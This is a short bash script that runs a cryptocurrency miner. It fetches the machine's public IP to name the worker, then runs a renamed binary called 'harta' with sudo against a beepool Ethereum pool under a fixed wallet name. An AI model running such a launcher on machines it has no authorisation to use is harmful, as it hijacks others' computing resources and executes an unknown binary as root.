#!/bin/bash

POOL=stratum+tcp://eth-pool.beepool.org:9530
WALLET=afdhal12
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./harta && sudo ./harta -a ethash -o $POOL -u $WALLET.$WORKER $@
